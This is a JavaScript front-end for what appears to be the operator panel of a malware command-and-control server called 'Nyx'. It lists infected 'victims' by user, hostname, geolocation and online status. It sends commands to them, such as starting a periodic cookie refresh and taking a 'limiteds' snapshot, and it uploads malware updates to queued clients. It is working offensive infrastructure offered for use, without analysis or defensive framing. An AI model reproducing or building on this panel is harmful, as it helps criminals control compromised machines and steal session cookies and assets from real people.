(function () {
  const initial = window.__NYX_INITIAL__ || { view: "home", vid: "" };
  let currentVid = initial.vid || "";
  const $ = (s, r = document) => r.querySelector(s);
  const $$ = (s, r = document) => [...r.querySelectorAll(s)];

  function showView(name) {
    ["home", "victim", "updates", "vault", "builder", "settings"].forEach((v) => {
      const el = document.getElementById("view-" + v);
      if (el) el.hidden = v !== name;
    });
    $$(".nav a").forEach((a) => a.classList.toggle("active", a.dataset.view === name));
    const titles = {
      home: "Overview",
      victim: "Victim " + (currentVid || ""),
      updates: "Updates",
      vault: "Vault",
      builder: "Builder",
      settings: "Settings",
    };
    $("#pageTitle").textContent = titles[name] || "Nyx";
    history.replaceState({}, "", name === "home" ? "/" : name === "victim" && currentVid ? "/v/" + currentVid : "/" + name);
  }

  async function api(path, opts) {
    const r = await fetch(path, {
      credentials: "same-origin",
      headers: { "Content-Type": "application/json", ...(opts && opts.headers) },
      ...opts,
    });
    if (r.status === 401) {
      location.href = "/login";
      return null;
    }
    return r.json().catch(() => ({}));
  }

  async function loadMe() {
    const me = await api("/api/me");
    if (me && me.user) $("#meInfo").textContent = me.user.username || me.user || "operator";
  }

  async function loadVictims() {
    const data = await api("/api/victims");
    const list = (data && (data.victims || data)) || [];
    const arr = Array.isArray(list) ? list : Object.entries(list).map(([vid, info]) => ({ vid, ...info }));
    const tbody = $("#victimTable tbody");
    if (!tbody) return;
    tbody.innerHTML = "";
    let active = 0;
    arr.forEach((v) => {
      const vid = v.vid || v.id;
      const last = v.last_seen || v.lastSeen || "";
      const online = last && Date.now() - new Date(last).getTime() < 60000;
      if (online) active++;
      const tr = document.createElement("tr");
      tr.innerHTML = `<td class="mono">${(vid || "").slice(0, 10)}</td>
        <td>${v.user || v.username || "—"}</td>
        <td>${v.hostname || v.host || "—"}</td>
        <td>${(v.geo && (v.geo.country || v.geo.city)) || "—"}</td>
        <td>${(v.tags || []).map((t) => '<span class="tag">' + t + "</span>").join(" ") || "—"}</td>
        <td>${online ? '<span class="badge">ON</span>' : '<span class="badge off">OFF</span>'}</td>
        <td><button class="btn" data-open="${vid}">Open</button></td>`;
      tbody.appendChild(tr);
    });
    $("#statTotal").textContent = arr.length;
    $("#statActive").textContent = active;
    tbody.onclick = (e) => {
      const b = e.target.closest("[data-open]");
      if (!b) return;
      currentVid = b.getAttribute("data-open");
      showView("victim");
      $("#vMeta").textContent = currentVid;
      loadVictim(currentVid);
    };
  }

  async function loadVictim(vid) {
    const data = await api("/api/victim/" + encodeURIComponent(vid));
    if (!data) return;
    $("#vMeta").textContent = JSON.stringify(
      {
        vid,
        user: data.user || data.info?.user,
        host: data.hostname || data.info?.hostname,
        geo: data.geo,
        version: data.version,
      },
      null,
      2
    );
    const tags = await api("/api/tags/" + encodeURIComponent(vid));
    if (tags && tags.tags) $("#tagInput").value = tags.tags.join(", ");
  }

  async function sendCmd(cmd) {
    if (!currentVid) return;
    let path = "/api/cmd";
    let body = { vid: currentVid, cmd };
    if (cmd === "cookie_refresh_start") {
      path = "/api/cmd/cookie_refresh";
      body = { vid: currentVid, action: "start", interval: 600 };
    } else if (cmd === "limiteds_snapshot") {
      path = "/api/cmd/limiteds";
      body = { vid: currentVid };
    }
    await api(path, { method: "POST", body: JSON.stringify(body) });
    $("#vActivity").textContent = (new Date().toISOString() + " → " + cmd + "\n") + ($("#vActivity").textContent || "");
  }

  function bindCmds() {
    $$("#view-victim [data-cmd]").forEach((b) => {
      b.onclick = () => sendCmd(b.getAttribute("data-cmd"));
    });
    const save = $("#saveTags");
    if (save) {
      save.onclick = async () => {
        const tags = ($("#tagInput").value || "")
          .split(",")
          .map((s) => s.trim())
          .filter(Boolean);
        await api("/api/tags/" + encodeURIComponent(currentVid), {
          method: "POST",
          body: JSON.stringify({ tags }),
        });
      };
    }
  }

  function bindUpdateDrop() {
    const drop = $("#updateDrop");
    const file = $("#updateFile");
    if (!drop || !file) return;
    drop.onclick = () => file.click();
    drop.ondragover = (e) => {
      e.preventDefault();
      drop.classList.add("drag");
    };
    drop.ondragleave = () => drop.classList.remove("drag");
    drop.ondrop = (e) => {
      e.preventDefault();
      drop.classList.remove("drag");
      if (e.dataTransfer.files[0]) uploadUpdate(e.dataTransfer.files[0]);
    };
    file.onchange = () => {
      if (file.files[0]) uploadUpdate(file.files[0]);
    };
  }

  async function uploadUpdate(f) {
    const fd = new FormData();
    fd.append("file", f);
    fd.append("version", "3.2.0");
    $("#updateStatus").textContent = "Uploading...";
    const r = await fetch("/api/update/upload", { method: "POST", body: fd, credentials: "same-origin" });
    const j = await r.json().catch(() => ({}));
    $("#updateStatus").textContent = j.ok
      ? `Queued ${j.queued} clients · ${j.file}`
      : "Failed: " + (j.error || r.status);
  }

  
  function bindMobileNav() {
    const btn = $("#menuBtn");
    const side = document.querySelector(".side");
    const backdrop = $("#sideBackdrop");
    if (!btn || !side) return;
    const close = () => {
      side.classList.remove("open");
      if (backdrop) backdrop.classList.remove("show");
    };
    const open = () => {
      side.classList.add("open");
      if (backdrop) backdrop.classList.add("show");
    };
    btn.onclick = () => {
      if (side.classList.contains("open")) close();
      else open();
    };
    if (backdrop) backdrop.onclick = close;
    document.querySelectorAll(".nav a").forEach((a) => {
      a.addEventListener("click", close);
    });
  }

  function bindNav() {
    $$(".nav a").forEach((a) => {
      a.onclick = (e) => {
        e.preventDefault();
        const v = a.dataset.view;
        if (v === "victim" && !currentVid) return;
        showView(v);
        if (v === "home") loadVictims();
      };
    });
    $("#btnRefresh").onclick = () => {
      loadVictims();
      if (currentVid) loadVictim(currentVid);
    };
  }

  function connectSocket() {
    try {
      const s = io({ transports: ["websocket", "polling"] });
      s.on("victim_update", () => loadVictims());
      s.on("activity", (e) => {
        if ($("#vActivity") && e && e.vid === currentVid) {
          $("#vActivity").textContent = JSON.stringify(e) + "\n" + ($("#vActivity").textContent || "");
        }
      });
    } catch (e) {}
  }

  // boot
  bindNav();
  bindMobileNav();
  bindCmds();
  bindUpdateDrop();
  loadMe();
  const start = initial.view || "home";
  if (start === "victim" && initial.vid) {
    currentVid = initial.vid;
    showView("victim");
    loadVictim(currentVid);
  } else {
    showView(start === "victim" ? "home" : start);
  }
  loadVictims();
  connectSocket();
})();
